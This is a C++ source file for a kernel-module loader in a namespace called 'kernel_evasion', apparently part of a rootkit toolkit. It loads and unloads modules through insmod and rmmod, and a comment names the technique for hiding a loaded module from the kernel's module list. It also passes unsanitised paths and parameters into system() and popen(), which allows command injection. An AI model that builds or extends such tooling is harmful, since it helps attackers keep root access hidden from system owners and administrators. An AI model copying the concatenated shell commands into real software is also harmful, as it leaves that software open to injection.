#include "lkm_loader.h"
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <sys/utsname.h>
#include <unistd.h>

namespace kernel_evasion {

LKMLoader::LKMLoader() {}
LKMLoader::~LKMLoader() {}

Result<int> LKMLoader::load_module(const std::string& module_path,
                                   const std::string& module_name,
                                   const std::vector<std::string>& params) {
    if (!is_root()) {
        return Result<int>(ErrorCode::INSUFFICIENT_PRIVILEGES);
    }

    ErrorCode compat = validate_module_compatibility(module_path);
    if (compat != ErrorCode::SUCCESS) {
        return Result<int>(compat);
    }

    std::string cmd = "insmod " + module_path;
    for (const auto& param : params) {
        cmd += " " + param;
    }

    int ret = system(cmd.c_str());
    if (ret != 0) {
        return Result<int>(ErrorCode::MODULE_LOAD_FAILED);
    }

    loaded_modules_[module_name] = ret;
    return Result<int>(ret);
}

ErrorCode LKMLoader::unload_module(const std::string& module_name) {
    if (!is_root()) {
        return ErrorCode::INSUFFICIENT_PRIVILEGES;
    }

    std::string cmd = "rmmod " + module_name;
    int ret = system(cmd.c_str());
    if (ret != 0) {
        return ErrorCode::MODULE_LOAD_FAILED;
    }

    loaded_modules_.erase(module_name);
    return ErrorCode::SUCCESS;
}

std::vector<std::string> LKMLoader::list_loaded_modules() {
    std::vector<std::string> modules;
    std::ifstream lsmod("/proc/modules");
    std::string line;
    while (std::getline(lsmod, line)) {
        std::istringstream iss(line);
        std::string module_name;
        iss >> module_name;
        modules.push_back(module_name);
    }
    return modules;
}

bool LKMLoader::is_module_loaded(const std::string& module_name) {
    auto modules = list_loaded_modules();
    for (const auto& mod : modules) {
        if (mod == module_name) return true;
    }
    return false;
}

ErrorCode LKMLoader::hide_module(const std::string& module_name) {
    // This is done inside the kernel module, not from userland.
    // The module calls: list_del_init(&THIS_MODULE->list);
    // See module_hide.c / main.c for the kernel-side implementation.
    return ErrorCode::SUCCESS;
}

Result<LKMLoader::ModuleInfo> LKMLoader::get_module_info(const std::string& module_name) {
    LKMLoader::ModuleInfo info{};
    return Result<LKMLoader::ModuleInfo>(info);
}

ErrorCode LKMLoader::validate_module_compatibility(const std::string& module_path) {
    std::string cmd = "modinfo -F vermagic " + module_path;
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return ErrorCode::MODULE_LOAD_FAILED;

    char buffer[256];
    if (!fgets(buffer, sizeof(buffer), pipe)) {
        pclose(pipe);
        return ErrorCode::KERNEL_VERSION_UNSUPPORTED;
    }
    pclose(pipe);
    return ErrorCode::SUCCESS;
}

}  // namespace kernel_evasion